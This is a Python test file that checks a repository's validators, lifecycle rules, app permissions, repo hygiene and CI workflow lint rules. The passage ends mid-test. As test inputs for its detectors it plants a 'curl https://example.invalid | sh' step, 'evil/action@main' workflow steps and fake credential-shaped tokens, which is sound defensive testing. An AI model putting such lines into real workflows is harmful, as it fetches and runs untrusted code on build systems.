"""The checks themselves must catch what they claim to catch.

`tree()` builds a throwaway repo holding a planted fault. `clone()` copies this repo and plants
one in the copy, so that a check is run from its front door and not only by its parts.
"""
from __future__ import annotations

import ast
import base64
import contextlib
import copy
import io
import json
import pathlib
import tempfile
import unittest

from tools import (check_apps, check_authority, check_context, check_examples, check_lifecycle, check_purity,
                   check_repo, check_trials, check_workflows, redact_trial, verify, walk)
from tools.jsonschema_lite import SchemaError, validate

ROOT = check_authority.ROOT
GOOD = (ROOT / "examples" / "workflows" / "verify.yml").read_text()
STEP = "      - run: make verify\n"


SCRATCH = tempfile.TemporaryDirectory()     # removed when the run ends


def tree(files: dict) -> pathlib.Path:
    """A throwaway repo holding `files`, for a check to be run against."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def clone(files: dict) -> pathlib.Path:
    """A copy of this repo with `files` written over it."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "repo"
    walk.copy(ROOT, root)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def caught(problems: list, words: str) -> bool:
    return any(words in p for p in problems)


WALKS = {"walk", "fwalk", "rglob", "scandir", "copytree"}


def walkers(source: str) -> list:
    """(line, name) for each way `source` walks or copies a tree, read from its syntax, not its spelling."""
    found = []
    for node in ast.walk(ast.parse(source)):
        line = getattr(node, "lineno", 0)
        syntax = isinstance(node, ast.Attribute) and getattr(node.value, "id", "") == "ast"   # ast.walk
        if isinstance(node, ast.Attribute) and node.attr in WALKS and not syntax:
            found.append((line, node.attr))
        elif isinstance(node, ast.ImportFrom) and node.module != "tools":
            found += [(line, a.name) for a in node.names if a.name in WALKS]
        elif isinstance(node, ast.Call):
            name = getattr(node.func, "attr", getattr(node.func, "id", ""))
            if name in WALKS and isinstance(node.func, ast.Name):
                found.append((line, name))
            recursive = any(k.arg == "recursive" and not (isinstance(k.value, ast.Constant) and k.value.value is False)
                            for k in node.keywords)
            starred = any(isinstance(a, ast.Constant) and "**" in str(a.value) for a in node.args)
            if name in ("glob", "iglob") and (recursive or starred):
                found.append((line, name))
    return found


def rules(text: str) -> list:
    return sorted({rule for rule, _ in check_workflows.lint(text)})


class Validator(unittest.TestCase):
    def test_rejects_a_schema_it_cannot_enforce(self):
        with self.assertRaises(SchemaError):
            validate({}, {"type": "object", "patternProperties": {}})

    def test_a_boolean_is_not_an_integer(self):
        self.assertTrue(validate(True, {"type": "integer"}))

    def test_unexpected_property_is_an_error(self):
        schema = {"type": "object", "additionalProperties": False, "properties": {"a": {"type": "string"}}}
        self.assertEqual(validate({"a": "x", "b": 1}, schema), ["$: unexpected b"])

    def test_a_code_that_ends_in_a_newline_is_not_a_code(self):
        code = {"type": "string", "pattern": "^[a-z_]+$"}
        self.assertEqual(validate("empty_diff", code), [])
        self.assertTrue(validate("empty_diff\n", code))

    def test_a_schema_that_accepts_unknown_fields_is_caught(self):
        self.assertEqual(check_examples._open({"type": "object", "properties": {"a": {"type": "object"}}}),
                         ["$", "$.properties.a"])
        self.assertEqual(check_examples._open({"type": "object", "additionalProperties": {"type": "string"}}), [])
        for loose in (None, "no", {}, True):
            self.assertEqual(check_examples._open({"type": ["object", "null"], "additionalProperties": loose}), ["$"])

    def test_a_key_written_twice_is_refused(self):
        path = tree({"x.json": '{"limit": 3, "limit": 30}'}) / "x.json"
        with self.assertRaises(ValueError):
            check_examples._load(path)


class Examples(unittest.TestCase):
    def test_a_counter_example_that_is_accepted_is_caught(self):
        fine = (ROOT / "examples" / "facts.json").read_text()
        root = clone({"examples/invalid/facts.carries-prose.json": fine})
        self.assertTrue(caught(check_examples.run(root), "was accepted, and must be rejected"))

    def test_a_counter_example_wrong_in_two_ways_is_caught(self):
        facts = json.loads((ROOT / "examples" / "invalid" / "facts.carries-prose.json").read_text())
        facts["schema"] = "facts/2"
        root = clone({"examples/invalid/facts.carries-prose.json": json.dumps(facts)})
        self.assertTrue(caught(check_examples.run(root), "is wrong in 2 ways"))

    def test_an_example_that_does_not_validate_is_caught(self):
        self.assertTrue(caught(check_examples.run(clone({"examples/decision.json": "{}"})), "decision.json: $: missing"))

    def test_a_schema_with_no_example_and_a_data_file_with_no_schema_are_caught(self):
        root = clone({"schemas/verdict.schema.json": '{"type": "object", "additionalProperties": false}',
                      "config/extra.json": "{}", "examples/invalid/nothing.x.json": "{}"})
        problems = check_examples.run(root)
        self.assertTrue(caught(problems, "schema verdict has no example"))
        self.assertTrue(caught(problems, "config/extra.json is validated against no schema"))
        broken = check_examples.run(clone({"examples/facts.json": '{"schema": "facts/1", "schema": "facts/1"}',
                                           "schemas/rubric.schema.json": "{not json"}))
        self.assertTrue(caught(broken, "examples/facts.json cannot be read: a key is written twice"))
        self.assertTrue(caught(broken, "schemas/rubric.schema.json cannot be read"))
        self.assertTrue(caught(broken, "config/rubric-pr-review.json: no schema named rubric"))
        self.assertTrue(caught(problems, "no schema named nothing"))


def unbound(lc: dict, bound: str) -> dict:
    """`lc` with `bound` taken off every transition that names it."""
    return dict(lc, transitions=[dict(tr, bound=None) if tr["bound"] == bound else tr for tr in lc["transitions"]])


class Lifecycle(unittest.TestCase):
    def test_an_unbounded_factory_cycle_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) in (("adjudicating", "addressing"), ("addressing", "adjudicating")):
                tr["bound"] = None
        self.assertIn("the Factory can cycle with no bound and no person involved", check_lifecycle.check(lc))

    def test_a_dead_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["transitions"] = [tr for tr in lc["transitions"] if tr["from"] != "queued"]
        self.assertIn("no terminal state can be reached from: queued", check_lifecycle.check(lc))

    def test_a_hold_the_factory_could_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["transitions"].append({"from": "held", "to": "verifying", "by": "factory", "bound": "max_attempts"})
        self.assertTrue(caught(check_lifecycle.check(lc), "only a person takes a Work item out of held"))

    def test_an_issue_the_factory_could_serve_again_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load("issue"))
        lc["transitions"].append({"from": "not_served", "to": "ready", "by": "factory", "bound": None})
        self.assertTrue(caught(check_lifecycle.check(lc), "only a person takes a Work item out of not_served"))

    def test_a_hold_left_off_the_person_only_states_is_caught(self):
        lc = dict(check_lifecycle.load(), person_only_exits=["limbo"])
        problems = check_lifecycle.check(lc)
        self.assertTrue(caught(problems, "list held in person_only_exits"), problems)
        self.assertTrue(caught(problems, "person_only_exits names an undeclared state: limbo"), problems)

    def test_malformed_lifecycle_data_is_reported_not_raised(self):
        pr = check_lifecycle.load()
        pr["transitions"][0].pop("by")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": "[]", "lifecycle/pull_request.json": json.dumps(pr)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json does not match the Lifecycle schema"), problems)
        self.assertTrue(caught(problems, "lifecycle/pull_request.json does not match the Lifecycle schema"), problems)
        self.assertTrue(check_lifecycle.check({"states": "x"}))
        self.assertTrue(caught(check_lifecycle.run(clone({"config/defaults.json": "[]"})), "config/defaults.json"))
        self.assertTrue(caught(check_lifecycle.run(clone({"schemas/lifecycle.schema.json": "[]"})),
                               "schemas/lifecycle.schema.json"))

    def test_a_state_nothing_declares_or_reaches_or_times_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["states"].append("limbo")
        lc["transitions"].append({"from": "merged", "to": "nowhere", "by": "human", "bound": None})
        problems = check_lifecycle.check(lc)
        for words in ("state can never be reached: limbo", "no staleness limit for: limbo",
                      "a terminal state has a way out: merged", "an undeclared state: nowhere"):
            self.assertTrue(caught(problems, words), words)

    def test_an_issue_retried_with_no_bound_is_caught(self):
        # I-14. The cycle that failed the issue Lifecycle's first drawing: `ready` to `in_progress`
        # and back, when an opening Run ends having opened nothing.
        lc = check_lifecycle.load("issue")
        self.assertEqual(check_lifecycle.check(lc), [])
        self.assertIn(("in_progress", "ready", "factory", "max_attempts"),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        self.assertIn("the Factory can cycle with no bound and no person involved",
                      check_lifecycle.check(unbound(lc, "max_attempts")))

    def test_an_issue_retried_after_every_unmerged_close_is_caught(self):
        # I-43. `in_progress` or `in_review` back to `ready`, when a linked pull request closes unmerged.
        lc = check_lifecycle.load("issue")
        self.assertIn("the Factory can cycle with no bound and no person involved",
                      check_lifecycle.check(unbound(lc, "max_unmerged_closes")))

    def test_verify_checks_the_issue_lifecycle_too(self):
        lc = unbound(check_lifecycle.load("issue"), "max_attempts")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: the Factory can cycle"), problems)
        self.assertFalse(caught(problems, "lifecycle/pull_request.json"), problems)

    def test_a_work_item_with_no_lifecycle_is_caught(self):
        root = clone({"lifecycle/issues.json": (ROOT / "lifecycle" / "issue.json").read_text()})
        (root / "lifecycle" / "issue.json").unlink()
        problems = check_lifecycle.run(root)
        self.assertTrue(caught(problems, "no Lifecycle for the Work item issue"), problems)
        self.assertTrue(caught(problems, "lifecycle/issues.json declares the Work item issue"), problems)

    def test_a_bound_that_is_not_a_limit_is_caught(self):
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        del config["limits"]["max_unmerged_closes"]
        problems = check_lifecycle.run(clone({"config/defaults.json": json.dumps(config)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: the bound max_unmerged_closes is not a limit"),
                        problems)


class Authority(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "authority.json").read_text())

    def test_security_may_never_be_declined(self):
        self.table["categories"]["security"]["may_accept"].append("declined")
        self.assertTrue(caught(check_authority.run(self.table), "security"))

    def test_the_author_may_not_own_a_category(self):
        self.table["categories"]["functional"]["owner"] = "dev-lead"
        self.assertTrue(caught(check_authority.run(self.table), "author Role"))

    def test_a_value_held_twice_must_agree(self):
        self.table["max_rounds"] = 9
        self.assertTrue(caught(check_authority.run(self.table), "max_rounds differs"))

    def test_a_category_nobody_owns_is_caught(self):
        del self.table["categories"]["human"]
        self.table["categories"]["performance"] = {"owner": "pr-review", "may_accept": ["fixed"]}
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "category human, and nobody owns it"))
        self.assertTrue(caught(problems, "performance has an owner, and no Finding can carry it"))

    def test_a_category_a_model_judges_needs_a_role_and_no_role_shadows_itself(self):
        self.table["categories"]["functional"]["owner"] = "human"
        self.table["categories"]["security"]["shadow"] = "pr-review"
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "needs a Role as owner") and caught(problems, "cannot shadow itself"))


class Apps(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "apps.json").read_text())
        self.apps, self.needs = self.table["apps"], self.table["needs"]

    def check(self) -> list:
        facts = (ROOT / "schemas" / "facts.schema.json").read_text()
        return check_apps.run(tree({"config/apps.json": json.dumps(self.table), "schemas/facts.schema.json": facts}))

    def test_a_permission_nothing_needs_is_caught(self):
        self.apps["controller"]["permissions"]["checks"]["needs"] = []
        del self.apps["reader"]["permissions"]["issues"]["needs"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: checks names no Effect, write or read that needs it"))
        self.assertTrue(caught(problems, "reader: issues names no Effect, write or read that needs it"))

    def test_the_reader_given_any_write_is_caught(self):
        self.apps["reader"]["permissions"]["contents"]["level"] = "write"
        self.apps["reader"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "reader: contents is write; the reader App writes nothing"))
        self.assertTrue(caught(problems, "reader: pull_requests serves effect:comment; the reader App writes nothing"))

    def test_a_write_that_only_a_read_needs_is_caught(self):
        self.apps["pr-review"]["permissions"]["contents"]["level"] = "write"
        self.assertTrue(caught(self.check(), "pr-review: contents is write and only a read needs it"))

    def test_a_need_served_by_another_permission_or_level_is_caught(self):
        self.apps["controller"]["permissions"]["contents"]["needs"].append("read:facts.reviews")
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "controller: contents serves read:facts.reviews, which the table maps to "
                                         "pull_requests"))
        self.assertTrue(caught(problems, "controller: pull_requests is read and serves effect:comment, which the "
                                         "table maps to pull_requests write"))

    def test_a_grant_for_a_need_that_is_waiting_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("read:facts.queue")
        self.assertTrue(caught(self.check(), "controller: pull_requests serves read:facts.queue, which waits on issue 26"))

    def test_a_write_need_held_by_two_apps_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"] = {"level": "write", "needs": ["effect:comment"]}
        self.assertTrue(caught(self.check(), "effect:comment is held by controller and pr-review"))

    def test_a_need_with_no_mapping_and_no_wait_is_caught(self):
        self.needs["read:facts.reviews"] = {}
        self.needs["read:facts.threads"] = {"permission": "pull_requests", "level": "read", "waits_on": "trial P-2"}
        del self.needs["read:facts.item"]
        problems = self.check()
        self.assertTrue(caught(problems, "read:facts.reviews maps to no permission and waits on nothing"))
        self.assertTrue(caught(problems, "read:facts.threads both maps to a permission and waits"))
        self.assertTrue(caught(problems, "controller: metadata serves read:facts.item, which is not in the table of needs"))

    def test_a_read_of_a_fact_that_does_not_exist_is_caught(self):
        self.needs["read:facts.title"] = {"permission": "pull_requests", "level": "read"}
        self.assertTrue(caught(self.check(), "read:facts.title reads a field facts/1 does not have"))

    def test_an_app_installed_across_the_org_is_caught(self):
        self.apps["controller"]["installed_on"] = "all"
        self.apps["reader"]["installed_on"] = ["combsmith"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: installed_on is not a list of named repos"))
        self.assertTrue(caught(problems, "reader: installed_on is not a list of named repos"))

    def test_a_repo_named_twice_is_caught(self):
        self.apps["reader"]["installed_on"].append(self.apps["reader"]["installed_on"][0])
        self.assertTrue(caught(self.check(), "reader: combsmith/software-factory is named twice in installed_on"))

    def test_an_app_named_for_another_key_is_caught(self):
        self.apps["controller"]["name"] = "combsmith-sf-reader"
        self.assertTrue(caught(self.check(), "controller: the App is named combsmith-sf-reader; name it "
                                             "combsmith-sf-controller"))

    def test_a_file_that_is_missing_or_cannot_be_read_is_a_problem_not_a_crash(self):
        self.assertTrue(caught(check_apps.run(tree({"x": ""})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{"})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{}"})), "names no Apps"))


class Purity(unittest.TestCase):
    def test_io_in_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "import os\n\ndef f():\n    return open('x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "imports os") and caught(problems, "uses open"))

    def test_io_in_a_package_below_the_kernel_is_caught(self):
        root = tree({"kernel/a.py": "from kernel.extra import clock\n", "kernel/extra/clock.py": "import time\n"})
        self.assertTrue(caught(check_purity.run(root), "extra/clock.py:1 imports time"))

    def test_a_limit_written_into_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "def f(runs):\n    return len(runs) >= 3 or runs[0] == 1\n"})
        self.assertEqual(len(check_purity.run(root)), 1)

    def test_state_kept_between_calls_is_caught(self):
        root = tree({"kernel/x.py": "SEEN = {}\nKIND = 'held'\nNAMES = frozenset({'a'})\n"})
        self.assertEqual(check_purity.run(root), ["x.py:1 holds a value that can change; State is never stored"])
        hidden = {"a default": "def f(key, seen={}):\n    return seen\n",
                  "a class": "class Memo:\n    seen = {}\n",
                  "code at import": "if True:\n    SEEN = {}\n",
                  "a global": "def f():\n    global X\n    X = 1\n"}
        for name, text in hidden.items():
            self.assertTrue(check_purity.run(tree({"kernel/x.py": text})), name)

    def test_a_way_round_the_names_is_caught(self):
        root = tree({"kernel/x.py": "def f():\n    return __builtins__['open'], getattr(f, 'x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "uses __builtins__") and caught(problems, "uses getattr"))

    def test_no_kernel_and_a_kernel_that_cannot_be_read_are_problems_not_crashes(self):
        self.assertEqual(check_purity.run(tree({"x": ""})), ["there is no kernel/ to check"])
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "def f(:\n"})), "cannot be read as Python"))
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "async def f():\n    return 1\n"})), "async function"))


class Repo(unittest.TestCase):
    def test_third_party_code_is_caught(self):
        root = tree({"a.py": "import requests\n", "requirements.txt": "requests\n",
                     "tools/vendor/requests/__init__.py": "", "dev-requirements.txt": "x\n", "poetry.lock": ""})
        problems = check_repo.run(root)
        for words in ("imports requests", "requirements.txt: a dependency manifest", "dev-requirements.txt: a dep",
                      "poetry.lock: a dep", "copied in is still third-party"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_repo.run(tree({"docs/prd/requirements.md": "x", "a.py": "from . import b\n"})),
                                "manifest"))

    def test_code_loaded_round_the_import_list_is_caught(self):
        root = tree({"a.py": "s = __import__('socket')\nexec('import requests')\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "uses __import__") and caught(problems, "uses exec"))

    def test_something_shaped_like_a_credential_is_caught(self):
        for name in ("notes.md", "deploy.sh", "x.env", "key.pem"):
            root = tree({name: "token: " + "ghp_" + "a1B2" * 9 + "\n"})
            self.assertTrue(caught(check_repo.run(root), "shaped like a credential"), name)
        shapes = ["github_pat_" + "a1B2" * 9, "glpat-" + "a1B2" * 6, "sk-" + "ant-" + "a1B2" * 6, "AKIA" + "A1B2" * 4,
                  "xoxb" + "-1234567890-abc", "-----BEGIN RSA " + "PRIVATE KEY-----"]
        for shape in shapes:
            self.assertTrue(caught(check_repo.run(tree({"a.py": "X = '%s'\n" % shape})), "credential"), shape[:6])

    def test_a_model_named_by_its_full_id_is_caught_outside_the_documents(self):
        name = "claude-" + "opus-5-5"
        self.assertTrue(caught(check_repo.run(tree({"roles/pr-review/prompt.md": name})), "names a model"))
        self.assertTrue(caught(check_repo.run(tree({"config/x.json": '"gpt-' + '4o-mini"'})), "names a model"))
        self.assertFalse(caught(check_repo.run(tree({"docs/notes.md": name})), "names a model"))

    def test_an_edited_secrets_baseline_is_caught(self):
        whole = (ROOT / ".gitignore").read_text()
        self.assertFalse(caught(check_repo.run(tree({".gitignore": whole})), "baseline"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": whole.replace(".env\n", "", 1)})), "has been edited"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": "__pycache__/\n"})), "does not open with"))

    def test_code_owners_are_the_orgs_word_for_word(self):
        whole = (ROOT / ".github" / "CODEOWNERS").read_text()
        self.assertFalse(caught(check_repo.run(tree({".github/CODEOWNERS": whole})), "CODEOWNERS"))
        mine = whole + "/kernel/ @don-petry\n"
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": mine})), "not the org's file"))
        self.assertTrue(caught(check_repo.run(tree({"x": ""})), "CODEOWNERS is missing"))
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": whole, "CODEOWNERS": whole})),
                               "keep only .github/CODEOWNERS"))

    def test_a_second_definition_is_caught(self):
        root = tree({"a.py": "class T:\n    def test_x(self):\n        pass\n\n    def test_x(self):\n        pass\n",
                     "b.py": "async def f():\n    pass\n\nasync def f():\n    pass\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "a.py:5 defines test_x a second time") and caught(problems, "b.py:4 defines f"))
        prop = "class T:\n    @property\n    def x(self):\n        return 1\n\n    @x.setter\n    def x(self, v):\n        pass\n"
        self.assertFalse(caught(check_repo.run(tree({"a.py": prop})), "a second time"))

    def test_syntax_newer_than_the_oldest_python_is_caught(self):
        root = tree({"a.py": "match 1:\n    case 1:\n        pass\n"})
        self.assertTrue(caught(check_repo.run(root), "is not Python 3.9"))

    def test_a_draw_that_differs_between_python_versions_is_caught(self):
        root = tree({"sim/x.py": "import random\n\ndef f(self):\n    return self.rng.choice([1, 2]), self.rng.random()\n",
                     "sim/y.py": "from random import shuffle\n"})
        problems = check_repo.run(root)
        self.assertEqual(len([p for p in problems if "sim/x.py" in p]), 1)
        self.assertTrue(caught(problems, "calls choice") and caught(problems, "takes a draw from random by name"))

    def test_reaching_into_the_proof_of_concept_is_caught(self):
        root = tree({"a.json": json.dumps({"repo": "combsmith/" + check_repo.FOREIGN})})
        self.assertTrue(caught(check_repo.run(root), "proof-of-concept repo"))

    def test_a_test_where_nothing_will_run_it_is_caught(self):
        root = tree({"tools/test_checks.py": "", "tests/unit/test_new.py": "", "tests/test_ok.py": ""})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "tools/test_checks.py: a test outside tests/"))
        self.assertTrue(caught(problems, "tests/unit/test_new.py: a test below tests/"))
        self.assertFalse(caught(problems, "test_ok.py"))


class Workflows(unittest.TestCase):
    def test_the_example_passes_and_every_rule_has_been_tripped(self):
        self.assertEqual(check_workflows.run(), [])

    def test_a_rule_with_no_counter_example_is_caught(self):
        problems = check_workflows.run(tree({"examples/workflows/verify.yml": GOOD}))
        self.assertEqual(len(problems), len(check_workflows.RULES))

    def test_a_counter_example_must_break_its_rule_and_no_other(self):
        both = GOOD.replace("ubuntu-24.04", "ubuntu-latest").replace("    timeout-minutes: 15\n", "")
        root = clone({"examples/workflows/invalid/runner.two-faults.yml": both,
                      "examples/workflows/invalid/soft.no-fault.yml": GOOD})
        problems = check_workflows.run(root)
        self.assertTrue(caught(problems, "runner.two-faults.yml: must break the rule 'runner' and no other"))
        self.assertTrue(caught(problems, "soft.no-fault.yml: must break the rule 'soft' and no other, and breaks none"))

    def test_an_example_in_the_standard_that_has_drifted_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD,
                     "docs/standards/workflows.md": "```yaml\n" + GOOD.replace("15", "90") + "```\n"})
        self.assertTrue(caught(check_workflows.run(root), "word for word"))

    def test_the_required_check_that_has_drifted_from_its_example_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD.replace("15", "45")})
        self.assertTrue(caught(check_workflows.run(root), "change both together"))
        bumped = GOOD.replace("3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "a" * 40 + " # v8.0.0")
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": bumped})
        self.assertFalse(caught(check_workflows.run(root), "change both together"))

    def test_a_live_workflow_is_held_to_the_rules(self):
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        problems = check_workflows.run(tree({".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
        self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"))
        self.assertTrue(caught(problems, "holds workflows and not verify.yml"))
        self.assertTrue(caught(check_workflows.run(tree({".github/actions/setup/action.yml": "x"})), "a local action"))

    def test_an_exempt_workflow_is_held_word_for_word(self):
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        as_written = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan})))
        self.assertFalse(caught(as_written, "ci.yml"))
        changed = scan.replace("gitleaks detect", "curl https://example.invalid | sh; gitleaks detect")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": changed}))),
                               "ci.yml is exempt from a rule, so it is held word for word"))
        # The exemption is from one rule. Under another name the same text is refused.
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/scan.yml": scan}))),
                               "scan.yml: [install]"))
        other = scan.replace("ubuntu-24.04", "ubuntu-latest")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": other}))),
                               "ci.yml: [runner]"))

    def test_a_rule_is_not_dodged_by_writing_the_workflow_another_way(self):
        ways = {
            "a mapping on one line": (GOOD.replace(STEP, "      - {uses: evil/action@main, continue-on-error: true}\n"), "form"),
            "two spaces after the dash": (GOOD.replace(STEP, "      -  uses: actions/checkout@v7\n"), "form"),
            "a quoted key": (GOOD.replace("    runs-on:", '    "runs-on":'), "form"),
            "a colon set apart": (GOOD.replace(STEP, "      - uses : evil/action@main\n"), "form"),
            "an escaped event name": (GOOD.replace("  merge_group:\n", '  merge_group:\n  "pull_request\\x5ftarget":\n'), "form"),
            "a list on one line": (GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule: [{cron: '0 * * * *'}]\n"), "form"),
            "an anchor": (GOOD.replace(STEP, "      - run: &cmd make verify\n      - run: *cmd\n"), "form"),
            "another installer": (GOOD.replace(STEP, "      - run: pipx install ruff\n"), "install"),
            "a download in python": (GOOD.replace(STEP, '      - run: python3 -c "import urllib.request"\n'), "install"),
            "a failure swallowed in shell": (GOOD.replace(STEP, "      - run: make verify || true\n"), "install"),
            "read-all": (GOOD.replace("permissions: {}", "permissions: read-all"), "permissions"),
            "write-all on a job": (GOOD.replace("      contents: read\n", "      write-all\n"), "form"),
            "woken by another workflow": (GOOD.replace("  merge_group:\n", "  merge_group:\n  workflow_run:\n"), "target"),
            "every thirty minutes": (GOOD.replace("  merge_group:\n", '  merge_group:\n  schedule:\n    - cron: "0,30 * * * *"\n'), "cron"),
            "a runner from a matrix": (GOOD.replace("ubuntu-24.04", "${{ matrix.os }}"), "runner"),
            "a runner in a list": (GOOD.replace("    runs-on: ubuntu-24.04\n", "    runs-on:\n      - ubuntu-latest\n"), "runner"),
            "a token in lower case": (GOOD.replace(STEP, STEP + "        env:\n          T: ${{ secrets.gh_pat }}\n"), "token"),
            "inherit in quotes": (GOOD.replace("  verify:\n", '  c:\n    uses: ./.github/workflows/o.yml\n    secrets: "inherit"\n  verify:\n'), "token"),
            "a branch filter": (GOOD.replace("  pull_request:\n", "  pull_request:\n    branches:\n      - release\n"), "queue"),
            "an expression in a script": (GOOD.replace(STEP, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n        with:\n          script: ${{ github.event.comment.body }}\n"), "expression"),
            "a checkout in quotes": (GOOD.replace("actions/checkout@", '"actions/checkout@').replace(" # v7.0.1\n        with:\n          persist-credentials: false", '" # v7.0.1'), "credentials"),
            "a limit named in a comment": (GOOD.replace("    timeout-minutes: 15\n", "").replace("ubuntu-24.04\n", "ubuntu-24.04 # timeout-minutes: later\n"), "timeout"),
            "windows line ends": (GOOD.replace("\n", "\r\n"), "form"),
            "nothing at all": ("", "form"),
        }
        for name, (text, rule) in ways.items():
            self.assertIn(rule, rules(text), name)

    def test_a_workflow_that_keeps_the_rules_is_not_refused(self):
        fine = {
            "continue-on-error: false": GOOD.replace(STEP, STEP + "        continue-on-error: false\n"),
            "a comment naming a banned event": GOOD.replace("  pull_request:\n", "  pull_request:    # never pull_request_target\n"),
            "a secret whose name holds the letters": GOOD.replace(STEP, STEP + "        env:\n          K: ${{ secrets.RELAY_DISPATCH_KEY }}\n"),
            "the org's reusable at its channel": GOOD.replace("  verify:\n", "  shield:\n    uses: combsmith/.github/.github/workflows/agent-shield-reusable.yml@agent-shield/v2-stable\n  verify:\n"),
            "an off-zero schedule": GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule:\n    - cron: '17,47 * * * *'\n"),
            "indented by four": "\n".join((len(l) - len(l.lstrip(" "))) * " " + l for l in GOOD.split("\n")),
        }
        for name, text in fine.items():
            self.assertEqual(rules(text), [], name)


class Context(unittest.TestCase):
    def test_a_rule_with_no_check_is_caught(self):
        root = tree({"tools/check_x.py": "", "README.md": "", "docs/a.md": ""})
        held = check_context._held
        self.assertTrue(caught(held("Reviewers look for it", "rule", root, root), "names no check"))
        self.assertEqual(held("`tools/check_x.py`", "rule", root, root), [])
        # A document that exists is not a check.
        self.assertTrue(caught(held("`README.md`", "rule", root, root), "names no check"))
        self.assertTrue(caught(held("the reviewers, see `docs/`", "rule", root, root), "names no check"))

    def test_a_rule_whose_wait_is_over_is_caught(self):
        root = tree({"harness/apply.py": "", "CODEOWNERS": ""})
        held = check_context._held
        self.assertEqual(held("waiting on `roles/`", "rule", root, root), [])
        self.assertEqual(held("Waiting on `roles/`", "rule", root, root), [])
        self.assertTrue(caught(held("waiting on `harness/`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `harness/never.py`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `.github/CODEOWNERS`", "rule", root, root), "exists now"))

    def test_a_rule_that_cites_a_test_expected_to_fail_must_say_so(self):
        root = tree({"tests/t.py": "@pending\ndef test_later(self):\n    pass\n\ndef test_now(self):\n    pass\n"})
        held = check_context._held
        self.assertTrue(caught(held("`tests/t.py::test_later`", "rule", root, root), "is expected to fail"))
        self.assertEqual(held("not held yet: `tests/t.py::test_later`", "rule", root, root), [])
        self.assertTrue(caught(held("not held yet: `tests/t.py::test_now`", "rule", root, root), "names no test marked"))

    def test_a_wait_on_a_name_nothing_will_ever_have_is_caught(self):
        root = tree({"x": ""})
        self.assertTrue(caught(check_context._held("waiting on `someday/`", "rule", root, root), "not a planned"))

    def test_a_path_or_a_test_that_does_not_exist_is_caught(self):
        here = "class Real:\n    def test_present(self):\n        pass\n    # def test_gone(self): was deleted\n"
        text = ("See `tools/gone.py`, `scripts/gone.sh`, `toools/`, `harness/`, `tools/here.py:12`, [a link](docs/gone.md),\n"
                "`tools/here.py::test_missing`, `tools/here.py::test_gone`, `tools/here.py::Unreal.test_present`,\n"
                "`tools/here.py::Real.test_present` and [the rules](#12-rules). Run python3 -m tools.here.\n")
        root = tree({"docs/a.md": text, "tools/here.py": here})
